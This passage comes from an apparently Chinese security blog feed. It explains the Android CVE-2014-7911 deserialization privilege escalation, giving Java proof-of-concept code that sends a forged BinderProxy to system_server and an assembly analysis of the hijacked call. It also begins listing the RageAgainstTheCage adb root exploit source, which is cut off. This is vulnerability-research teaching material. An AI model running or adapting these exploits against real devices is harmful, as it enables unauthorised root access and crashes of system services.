title="构建恶意BinderProxy对象，设置mOrgue字段的值为shellcode或ROP Chain的起始地址.验证POC时这里是一个随机无效地址"></a>构建恶意BinderProxy对象，设置mOrgue字段的值为shellcode或ROP Chain的起始地址.验证POC时这里是一个随机无效地址</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> AAdroid.os;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinderProxy</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> mObject = <span class="number">0x1337beef</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> mOrgue = <span class="number">0x1337beef</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2、构建恶意BinderProxy并进行Binder跨进程通信。"><a href="#2、构建恶意BinderProxy并进行Binder跨进程通信。" class="headerlink" title="2、构建恶意BinderProxy并进行Binder跨进程通信。"></a>2、构建恶意BinderProxy并进行Binder跨进程通信。</h3><p>Binder通信的原理这里不再过多赘述，在以前的博客中有过详细介绍。这里只简单提一下流程：</p><blockquote><p>Android中存在Client和Server的概念，所有请求方都被称为Client，如PackageManager、ActivityManager。所有接收请求的服务方都被称为Server，如PackageManagerService、ActivityManagerService。他们本身就属于不同的进程，因此通信时属于跨进程通信，实现工具为Binder。</p><p>Server首先在ServiceManager中注册，也就是留下一个远端调用接口，用这个接口可以去获取Server的服务。Client再请求时，把自己的基本信息比如UID、PID等发送给Binder Driver传过去，并进入等待状态，此时传送的数据为Tran_data（可能不叫这个，具体的忘了）。Binder driver再携带请求方的基本信息发送Transaction给Server，Server接收到了之后判断权限，符合就返值。Driver把返回的值用Tran_reply的方式告诉Client，并结束这次通信。</p></blockquote><p>下面放出这张通俗易懂的神图</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/binder.jpg" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/binder.jpg"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">expolit</span><span class="params">(<span class="keyword">int</span> static_address)</span> </span>&#123;</span><br><span class="line">        Context context = getBaseContext();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 构造bundle，把恶意BinderProxy打包，准备发送</span></span><br><span class="line">            Bundle bundle = <span class="keyword">new</span> Bundle();</span><br><span class="line">            AAdroid.os.BinderProxy evilProxy = <span class="keyword">new</span> AAdroid.os.BinderProxy();</span><br><span class="line">            evilProxy.mOrgue = static_address;</span><br><span class="line">            Log.e(<span class="string">"cve"</span>, <span class="string">"mOrgue: "</span> + static_address + <span class="string">""</span>); </span><br><span class="line">            bundle.putSerializable(<span class="string">"eatthis"</span>, evilProxy);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过反射获取UserManager，用他向System_Server发送恶意序列化数据</span></span><br><span class="line">            Class clIUserManager = Class.forName(<span class="string">"android.os.IUserManager"</span>);</span><br><span class="line">            Class[] umSubclasses = clIUserManager.getDeclaredClasses();</span><br><span class="line">            Log.e(<span class="string">"mylog"</span>, umSubclasses.length + <span class="string">" inner classes found"</span>);</span><br><span class="line">            Class clStub = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">for</span> (Class c : umSubclasses) &#123;</span><br><span class="line">                Log.e(<span class="string">"mylog"</span>, <span class="string">"inner class: "</span> + c.getCanonicalName());</span><br><span class="line">                <span class="keyword">if</span> (c.getCanonicalName().equals(<span class="string">"android.os.IUserManager.Stub"</span>)) &#123;</span><br><span class="line">                    clStub = c;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 准备通信过程中必要的Transaction变量和数据</span></span><br><span class="line">            Field fTRANSACTION_setApplicationRestrictions =</span><br><span class="line">                    clStub.getDeclaredField(<span class="string">"TRANSACTION_setApplicationRestrictions"</span>);</span><br><span class="line">            fTRANSACTION_setApplicationRestrictions.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            TRANSACTION_setApplicationRestrictions =</span><br><span class="line">                    fTRANSACTION_setApplicationRestrictions.getInt(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">            UserManager um = (UserManager) context.getSystemService(Context.USER_SERVICE);</span><br><span class="line">            Field fService = UserManager.class.getDeclaredField(<span class="string">"mService"</span>);</span><br><span class="line">            fService.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object proxy = fService.get(um);</span><br><span class="line"></span><br><span class="line">            Class[] stSubclasses = clStub.getDeclaredClasses();</span><br><span class="line">            Log.e(<span class="string">"mylog"</span>, stSubclasses.length + <span class="string">" inner classes found"</span>);</span><br><span class="line">            clProxy = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">for</span> (Class c : stSubclasses) &#123;</span><br><span class="line">                Log.e(<span class="string">"mylog"</span>, <span class="string">"inner class: "</span> + c.getCanonicalName());</span><br><span class="line">                <span class="keyword">if</span> (c.getCanonicalName().equals(<span class="string">"android.os.IUserManager.Stub.Proxy"</span>)) &#123;</span><br><span class="line">                    clProxy = c;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取远端接口</span></span><br><span class="line">            Field fRemote = clProxy.getDeclaredField(<span class="string">"mRemote"</span>);</span><br><span class="line">            fRemote.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            mRemote = (IBinder) fRemote.get(proxy);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取请求方的基本信息，比如UID</span></span><br><span class="line">            UserHandle me = android.os.Process.myUserHandle();</span><br><span class="line">            <span class="comment">// 发送数据</span></span><br><span class="line">            setApplicationRestrictions(context.getPackageName(), bundle, me.hashCode());</span><br><span class="line"></span><br><span class="line">            Log.i(<span class="string">"badserial"</span>, <span class="string">"waiting for boom here and over in the system service..."</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setApplicationRestrictions</span><span class="params">(String packageName, Bundle restrictions, <span class="keyword">int</span> userHandle)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="comment">// data是发过去的数据，reply是返回的数据，都是序列化格式</span></span><br><span class="line">        android.os.Parcel _data = android.os.Parcel.obtain();</span><br><span class="line">        android.os.Parcel _reply = android.os.Parcel.obtain();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 将外部传入的信息“格式化”</span></span><br><span class="line">            _data.writeInterfaceToken(DESCRIPTOR);</span><br><span class="line">            _data.writeString(packageName);</span><br><span class="line">            _data.writeInt(<span class="number">1</span>);</span><br><span class="line">            restrictions.writeToParcel(_data, <span class="number">0</span>);</span><br><span class="line">            _data.writeInt(userHandle);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 因为Parcel的数据会有一定的格式，因此我们先把恶意数据用Parcel格式化一次，</span></span><br><span class="line">            <span class="comment">// 接着把它格式完的值提出来，修改里面的指定字段。</span></span><br><span class="line">            <span class="comment">// 最后再放入一个新的Parcel中，就生成了一个格式合法但数据非法的恶意Parcel</span></span><br><span class="line">            <span class="keyword">byte</span>[] data = _data.marshall();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; <span class="keyword">true</span>; i++) &#123;</span><br><span class="line">                <span class="comment">// 恶意BinderProxy属于AAdroid</span></span><br><span class="line">                <span class="comment">// 正版BinderProxy属于Android</span></span><br><span class="line">                <span class="comment">// 在数组中把恶意对象伪造成正常对象</span></span><br><span class="line">                <span class="keyword">if</span> (data[i] == <span class="string">'A'</span> &amp;&amp; data[i + <span class="number">1</span>] == <span class="string">'A'</span> &amp;&amp; data[i + <span class="number">2</span>] == <span class="string">'d'</span> &amp;&amp; data[i + <span class="number">3</span>] == <span class="string">'r'</span>) &#123;</span><br><span class="line">                    data[i] = <span class="string">'a'</span>;</span><br><span class="line">                    data[i + <span class="number">1</span>] = <span class="string">'n'</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            Log.e(<span class="string">"cve"</span>, Arrays.toString(data)); </span><br><span class="line">            <span class="comment">// 回收老Parcel，创建恶意Parcel</span></span><br><span class="line">            _data.recycle();</span><br><span class="line">            _data = Parcel.obtain();</span><br><span class="line">            _data.unmarshall(data, <span class="number">0</span>, data.length);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 发送数据</span></span><br><span class="line">            mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, <span class="number">0</span>);</span><br><span class="line">            _reply.readException();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            _reply.recycle();</span><br><span class="line">            _data.recycle();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过上面这几步就已完成恶意数据的发送，只要此时再触发一次GC，就能执行finalize方法，从而控制DeathRecipientList* drl这个指针。</p><h3 id="3、汇编分析"><a href="#3、汇编分析" class="headerlink" title="3、汇编分析"></a>3、汇编分析</h3><p>从/system/lib中pull出libutils.so，ida解析</p><p><strong>c++整体如下：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> RefBase::decStrong(<span class="keyword">const</span> <span class="keyword">void</span>* id) <span class="keyword">const</span></span><br><span class="line">&#123;</span><br><span class="line">    weakref_impl* <span class="keyword">const</span> refs = mRefs;</span><br><span class="line">    refs-&gt;removeStrongRef(id);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int32_t</span> c = android_atomic_dec(&amp;refs-&gt;mStrong);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> PRINT_REFS</span></span><br><span class="line">    ALOGD(<span class="string">"decStrong of %p from %p: cnt=%d\n"</span>, <span class="keyword">this</span>, id, c);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    ALOG_ASSERT(c &gt;= <span class="number">1</span>, <span class="string">"decStrong() called on %p too many times"</span>, refs);</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 攻击这个方法</span></span><br><span class="line">        refs-&gt;mBase-&gt;onLastStrongRef(id);</span><br><span class="line">        <span class="keyword">if</span> ((refs-&gt;mFlags&amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) &#123;</span><br><span class="line">            <span class="keyword">delete</span> <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    refs-&gt;decWeak(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>汇编整体如下：</strong></p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/cve-2014-7911_assembly.png" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/cve-2014-7911_assembly.png"></p><p><strong>注意一点，decStrong的汇编代码有两个参数，一个是this指针（我们可控），一个是void*的地址</strong></p><p><strong>refs对象内部有4个局部变量，分别叫mStrong、mWeak、mBase、mFlags。无虚函数，因此mStrong的地址就是refs的地址，mBase = refs+8</strong></p><p>分开来看：</p><p>1、</p><blockquote><p>weakref_impl* const refs = mRefs;<br>refs-&gt;removeStrongRef(id);<br>const int32_t c = android_atomic_dec(&amp;refs-&gt;mStrong);</p></blockquote><p><strong>对应的汇编为：</strong></p><blockquote><p> LDR             R4, [R0,#4]    ; R0是this指针，我们可控，根据内存布局可知，R0+4指向mRefs<br> MOV             R6, R1        ; R1是参数id。refs-&gt;removeStrongRef(id)在代码里是空实现，</p><pre><code>; 因此被直接省略掉了</code></pre><p>MOV             R0, R4        ; R0 = refs<br>BLX             android_atomic_dec    ; 入参是refs-&gt;mStrong，因为refs没有实现类，</p><p>​                                ; 因此mStrong是它的第一个成员变量，mStrong的地址=refs</p></blockquote><p>2、 </p><blockquote><p>if (c == 1) {<br>    // 攻击这个方法<br>    refs-&gt;mBase-&gt;onLastStrongRef(id);<br>    if ((refs-&gt;mFlags&amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) {<br>        delete this;<br>    }<br>}</p></blockquote><p><strong>对应的汇编为：</strong></p><blockquote><p>.text:0000D180                 CMP             R0, #1        ; 将android_atomic_dec的值c与1进行比较<br>.text:0000D182                 BNE             loc_D19C<br>.text:0000D184                 LDR             R0, [R4,#8]   ; R4 = refs. r0 = refs+8 = refs-&gt;mBase<br>.text:0000D186                 MOV            R1, R6        ; R1 = R6 = id<br>.text:0000D188                 LDR             R3, [R0]<br>.text:0000D18A                 LDR             R2, [R3,#0xC] ; onLastStrongRef是mBase的虚函数，因此到</p><pre><code>mBase+0XC的位置取偏移，然后跳转</code></pre><p>.text:0000D18C                 BLX             R2</p></blockquote><p>这里的BLX R2就是我们的攻击点。</p><p>所以我们要做的就是：构建Shellcode，让This指针指向头部从而控制R0（其实就是让mOrgue指向shellcode首部）。Shellcode头部+4的地方是mRefs，Shellcode+12的地方是mBase，Shellcode+12+0xC的地方就是最终的恶意代码攻击开始的地方。</p><p>需要注意的点：android_atomic_dec这个函数（检测引用计数的）会对参数进行减1操作并判断结果是否为0，如果为0，就表明该数没有其他地方在引用了，返回值为1.因此，我们需要将refs-&gt;mStrong的值设置为1</p><h4 id="因此，可写出如下的Shellcode："><a href="#因此，可写出如下的Shellcode：" class="headerlink" title="因此，可写出如下的Shellcode："></a>因此，可写出如下的Shellcode：</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(*(*(mOrgue+<span class="number">4</span>)) == <span class="number">1</span>) &#123;</span><br><span class="line">refs = *(mOrgue+<span class="number">4</span>);</span><br><span class="line">r2 = *(*(*(refs+<span class="number">8</span>))+<span class="number">12</span>);</span><br><span class="line">blx r2 ; &lt;—— controlled;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4、绕过ALSR"><a href="#4、绕过ALSR" class="headerlink" title="4、绕过ALSR"></a>4、绕过ALSR</h3><blockquote><p>与其他操作系统一样，Android对ASLR机制的支持也是分阶段完成的，最早在<strong>4.0</strong>版本引入，仅仅实现了对<strong>栈</strong>和<strong>nmap</strong>系统调用所创建的区域（包括动态链接库）的随机化。在<strong>4.0.3</strong>实现了对<strong>堆</strong>空间的随机化，但是<strong>动态连接器(linker)</strong>本身的随机化并未实现，<strong>4.1.1</strong>为linker和所有其他的系统二进制文件进行了随机化，目前Android系统已经完全支持了ASLR机制。</p></blockquote><p>Android内的所有进程都fork自Zygote进程，</p><h3 id="5、绕过DEP"><a href="#5、绕过DEP" class="headerlink" title="5、绕过DEP"></a>5、绕过DEP</h3><h3 id="6、制作Shellcode，提权"><a href="#6、制作Shellcode，提权" class="headerlink" title="6、制作Shellcode，提权"></a>6、制作Shellcode，提权</h3><h2 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h2><ul><li><a href="https://researchcenter.paloaltonetworks.com/2015/01/cve-2014-7911-deep-dive-analysis-android-system-service-vulnerability-exploitation/" target="_blank" rel="noopener">https://researchcenter.paloaltonetworks.com/2015/01/cve-2014-7911-deep-dive-analysis-android-system-service-vulnerability-exploitation/</a></li><li><a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">https://github.com/JonathanSalwan/ROPgadget</a></li><li><a href="https://github.com/retme7/CVE-2014-7911_poc" target="_blank" rel="noopener">https://github.com/retme7/CVE-2014-7911_poc</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文内容：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;因Android反序列化漏洞导致的Android本地提权&lt;/li&gt;
&lt;li&gt;Android平台上的ROP：绕过DEP&lt;/li&gt;
&lt;li&gt;绕过Android平台的ASLR&lt;/li&gt;
&lt;li&gt;Android Binder&lt;/li&gt;
&lt;li&gt;Java序列化与反序列化&lt;/li&gt;
&lt;li&gt;Heap Spary&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;CVE-2014-7911&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;摘自NVD&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;luni/src/main/java/java/io/ObjectInputStream.java in the java.io.ObjectInputStream implementation in Android before 5.0.0 does not verify that deserialization will result in an object that met the requirements for serialization, which allows attackers to execute arbitrary code via a crafted finalize method for a serialized object in an ArrayMap Parcel within an intent sent to system_service, as demonstrated by the finalize method of android.os.BinderProxy, aka Bug 15874291.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Source:&lt;/strong&gt;  MITRE&lt;br&gt;&lt;strong&gt;Description Last Modified:&lt;/strong&gt;  12/15/2014&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;POC: &lt;a href=&quot;https://github.com/CytQ/CVE-2014-7911_poc&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/CytQ/CVE-2014-7911_poc&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://imlzq.com/tags/Android/"/>
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="Root" scheme="http://imlzq.com/tags/Root/"/>
    
      <category term="专栏-提权" scheme="http://imlzq.com/tags/%E4%B8%93%E6%A0%8F-%E6%8F%90%E6%9D%83/"/>
    
      <category term="CVE" scheme="http://imlzq.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Android提权：RageAginstTheCage</title>
    <link href="http://imlzq.com/2018/09/01/RageAgainstTheCage/"/>
    <id>http://imlzq.com/2018/09/01/RageAgainstTheCage/</id>
    <published>2018-08-31T16:00:00.000Z</published>
    <updated>2019-05-01T08:59:16.443Z</updated>
    
    <content type="html"><![CDATA[<p>本文介绍利用adb获取Android系统的ROOT权限</p><a id="more"></a><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Android启动后init进程会读取init.rc文件并执行service adbd，从而启动adb的守护进程。故此时的adb属于root权限。</p><p>在它启动的过程中，它会读取系统的ro.secure标签。如果其为true，则将自身降权至shell，降权的方法也很简单。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setuid(AID_SHELL)</span><br><span class="line">setgid(AID_SHELL)</span><br></pre></td></tr></table></figure><p>那我们是否有办法在adb setuid和setgid的时候做手脚从而让它降权失效呢？这样的话adb就会以root权限继续执行。</p><p><strong>Tips</strong></p><p>Linux中的每个用户都有可以同时运行的进程上限。如果已打上限，那么新的进程便会创建失败</p><p>adb source code:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> adb\_main(<span class="keyword">int</span> is\_daemon)</span><br><span class="line">   &#123;</span><br><span class="line">       ......</span><br><span class="line">       property\_get(<span class="string">"ro.secure"</span>, value, <span class="string">""</span>);</span><br><span class="line">       <span class="keyword">if</span> (<span class="built_in">strcmp</span>(value, <span class="string">"1"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="comment">// don't run as root if ro.secure is set...</span></span><br><span class="line">           secure = <span class="number">1</span>;</span><br><span class="line">           ......</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (secure) &#123;</span><br><span class="line">          ......</span><br><span class="line">          setgid(AID\_SHELL);</span><br><span class="line">          setuid(AID\_SHELL);</span><br><span class="line">          ......</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="RageAginstTheCage"><a href="#RageAginstTheCage" class="headerlink" title="RageAginstTheCage"></a>RageAginstTheCage</h2><p>Source code如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* android 1.x/2.x adb setuid() root exploit</span></span><br><span class="line"><span class="comment"> * (C) 2010 The Android Exploid Crew</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Needs to be executed via adb -d shell. It may take a while until</span></span><br><span class="line"><span class="comment"> * all process slots are filled and the adb connection is reset.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * !!!This is PoC code for educational purposes only!!!</span></span><br><span class="line"><span class="comment"> * If you run it, it might crash your device and make it unusable!</span></span><br><span class="line"><span class="comment"> * So you use it at your own risk!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(msg);</span><br><span class="line"><span class="built_in">exit</span>(errno);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> find_adb()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">256</span>];</span><br><span class="line"><span 